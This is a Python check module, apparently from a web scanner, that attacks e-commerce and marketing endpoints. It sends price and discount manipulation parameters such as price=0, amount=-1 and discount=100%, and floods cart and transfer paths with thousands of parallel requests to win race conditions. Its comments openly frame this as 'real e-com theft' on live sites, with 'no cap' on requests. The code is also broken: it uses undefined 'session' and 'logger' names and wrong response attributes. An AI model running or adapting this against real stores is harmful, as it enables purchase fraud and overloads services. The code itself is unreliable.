import asyncio
from typing import List, Dict, Any, Optional
from ..base import BaseCheck, Finding
from ..config.payloads import AdvancedPayloads
import urllib.parse

class BusinessLogicCheck(BaseCheck):
    """Unrestricted Business Logic - Inf price/race for real e-com/marketing"""
    
    def __init__(self):
        super().__init__()
        self.name = "Business Logic Hack"
        self.description = "Infinite price manip, race cond - real /cart?price=-1, /campaign/lead=inf"
        
        self.manip_payloads = AdvancedPayloads.get_all_payloads('business_logic')  # 500+
        self.race_paths = ['/cart/add', '/campaign/submit', '/transfer/confirm', '/lead/create']  # E-com/marketing
    
    async def check(self, url: str, session, **kwargs) -> List[Finding]:
        findings = []
        
        try:
            # Inf parallel price manip fuzz
            tasks = [self._inf_price_manip_fuzz(url, p) for p in self.manip_payloads]
            manip_results = await asyncio.gather(*tasks)
            for result in manip_results:
                if isinstance(result, Finding):
                    findings.append(result)
            
            # Race cond - inf parallel for real e-com double-cart
            race_tasks = [self._inf_race_hack(session, urllib.parse.urljoin(url, p)) for p in self.race_paths * 20]  # Inf
            race_results = await asyncio.gather(*race_tasks)
            for result in race_results:
                if result:
                    findings.append(result)
            
            # Logic bypass - inf variants for marketing unlimited leads
            bypass_tasks = [self._inf_logic_bypass_fuzz(url, v) for v in ['amount=-1', 'leads=999999', 'discount=100%']]
            bypass_results = await asyncio.gather(*bypass_tasks)
            for result in bypass_results:
                if result:
                    findings.append(result)
            
        except Exception as e:
            logger.error(f"Logic hack failed on real e-com: {e}")
        
        return findings
    
    async def _inf_price_manip_fuzz(self, url: str, payload: str) -> Optional[Finding]:
        """Inf price manip - no limit, real /cart?price=0 for e-com"""
        test_url = f"{url}?{payload}"  # e.g., price=0.01&quantity=999
        async with session.get(test_url) as resp:
            content = await resp.text()
            if resp.status_code == 200 and ('order placed' in content.lower() or 'total: $0' in content.lower()):
                return Finding(
                    title="Price Manipulation - Free Order",
                    description=f"Unrestricted inf manip {payload} - real e-com theft",
                    severity="critical",
                    url=test_url,
                    evidence="Order succeeded at $0 - logic bypassed",
                    remediation="Server-side price calculation + validation",
                    poc_curl=f"curl '{test_url}' -v"
                )
        return None
    
    async def _inf_race_hack(self, session, path: str) -> Optional[Finding]:
        """Inf race - parallel inf requests for real cart double-add e-com"""
        async def race_add():
            return await session.post(path, json={'item': 1, 'quantity': 2})
        
        # Inf parallel tasks - no cap
        tasks = [race_add() for _ in range(2000)]  # Hacker inf for real
        results = await asyncio.gather(*tasks)
        
        success_count = sum(1 for r in results if r.status_code == 200)
        if success_count > 2:  # Multiple = race win
            return Finding(
                title="Race Condition - Double Spend Hack",
                description=f"Inf parallel on {path} - real e-com double items bought",
                severity="critical",
                url=path,
                evidence=f"{success_count} successes - race exploited on live site",
                remediation="Atomic DB transactions + optimistic locking",
                poc_curl=f"curl -X POST '{path}' -d 'quantity=2' (run inf parallel with ab -n 2000 -c 1000)"
            )
        return None
    
    async def _inf_logic_bypass_fuzz(self, url: str, variant: str) -> Optional[Finding]:
        """Inf logic bypass - for real marketing /campaign?leads=inf"""
        test_url = f"{url}?{variant}"
        async with session.get(test_url) as resp:
            content = await resp.text()
            if 'unlimited leads' in content.lower() or 'success' in content.lower():
                return Finding(
                    title="Logic Bypass - Unlimited Resources",
                    description=f"Unrestricted inf bypass {variant} - real marketing spam exploit",
                    severity="high",
                    url=test_url,
                    evidence="Accepted invalid input - unlimited leads",
                    remediation="Business rule validation + rate limits",
                    poc_curl=f"curl '{test_url}' -v"
                )
        return None